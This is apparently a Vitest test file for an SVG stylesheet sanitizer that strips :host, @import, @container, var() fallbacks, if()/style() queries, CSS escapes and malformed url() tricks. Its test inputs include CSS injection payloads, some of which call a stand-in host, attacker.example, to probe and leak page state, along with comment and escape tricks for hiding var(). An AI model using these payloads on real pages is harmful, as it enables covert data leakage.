import { afterEach, describe, expect, it, vi } from 'vitest'
import { svgOwnDeclarations, svgOwnStylesheet, svgOwnValue } from './svgStylesheet'

describe('svgOwnStylesheet', () => {
  afterEach(() => { vi.unstubAllGlobals() })

  it('keeps rules inside the drawing, inside groups too, and drops the ones that reach past it', () => {
    const kept = svgOwnStylesheet([
      '.a { fill: red; }',
      ':host(.x) { color: red; }',
      '@media screen { :host { color: red; } .b { fill: blue; } }',
      '@import url("https://attacker.example/x.css");',
      '@property --x { syntax: "<color>"; inherits: true; initial-value: red; }',
      '@page { margin: 0; }',
      '@container style(--accent: red) { rect { fill: red; } }',
      '.c:target { fill: red; }',
    ].join('\n'))
    expect(kept).toContain('.a')
    expect(kept).toContain('.b')
    expect(kept).not.toMatch(/:host|@import|@property|@page|@container|:target/i)
  })

  it('keeps the declarations that use drawing functions and drops the rest, one by one', () => {
    const kept = svgOwnStylesheet('.a { fill: rgb(1, 2, 3); stroke: url(#g); width: env(safe-area-inset-left); transform: rotate(4deg); }')
    expect(kept).toContain('fill')
    expect(kept).toContain('stroke')
    expect(kept).toContain('transform')
    expect(kept).not.toContain('env(')
  })

  it('keeps nothing when there is no stylesheet parser', () => {
    vi.stubGlobal('CSSStyleSheet', undefined)
    expect(svgOwnStylesheet('.a { fill: red; }')).toBe('')
  })
})

describe('svgOwnValue', () => {
  it('keeps a presentation value using drawing functions only', () => {
    expect(svgOwnValue('translate(1 2) rotate(3)')).toBe(true)
    expect(svgOwnValue('url(#g)')).toBe(true)
    expect(svgOwnValue('if(style(--a: b): red; else: blue)')).toBe(false)
    expect(svgOwnValue('\\69 f(x)')).toBe(false)
  })
})

describe('svgOwnDeclarations', () => {
  it('drops a declaration holding a function the drawing does not need, even unknown or upper-case ones', () => {
    expect(svgOwnDeclarations('fill: blue; stroke: future-fn(1); opacity: 0.5')).toBe('fill: blue; opacity: 0.5;')
    expect(svgOwnDeclarations('fill: IF(style(--a: b): red; else: blue); stroke: red')).toBe('stroke: red;')
  })

  it('drops a declaration using var(), whose fallback tests whether the page defines a property', () => {
    expect(svgOwnDeclarations('fill: blue; stroke: var(--flag, url(https://attacker.example/x))')).toBe('fill: blue;')
  })

  it('reads functions as tokens: strings, comments and unquoted url() are not code', () => {
    expect(svgOwnDeclarations('content: "if(style(x))"; fill: url(#a); stroke: if/**/(x)')).toBe('content: "if(style(x))"; fill: url(#a); stroke: if/**/(x);')
  })

  it('keeps nothing when an unquoted url() is not well formed, as in #url(', () => {
    expect(svgOwnDeclarations('fill: url(a(b)')).toBe('')
    expect(svgOwnDeclarations('stroke: #url(a" ) " ); background-image: var(--accent, url(https://attacker.example/x)); --z: "')).not.toContain('var(')
  })

  it('reads #url( and @url( as CSS does, a hash or at-keyword and a block, so a comment in it cannot hide var()', () => {
    for (const lead of ['#', '@']) {
      const kept = svgOwnDeclarations(`fill: ${lead}url(/*); stroke: "*/); mask: var(--accent, url(https://attacker.example/x)); --z: "`)
      expect(kept).not.toContain('var(')
      expect(kept).not.toContain('attacker.example')
    }
  })

  it('keeps nothing from a block with a string cut off by a newline', () => {
    const kept = svgOwnDeclarations('a:"x\n;b:"; fill: var(--x, red)')
    expect(kept).not.toContain('var(')
    expect(kept).toBe('')
  })

  it('keeps nothing from a block holding a CSS escape', () => {
    expect(svgOwnDeclarations('fill: blue; background-image: \\69\r\nf(\\73\r\ntyle(--a: b): url(x); else: none)')).toBe('')
  })
})
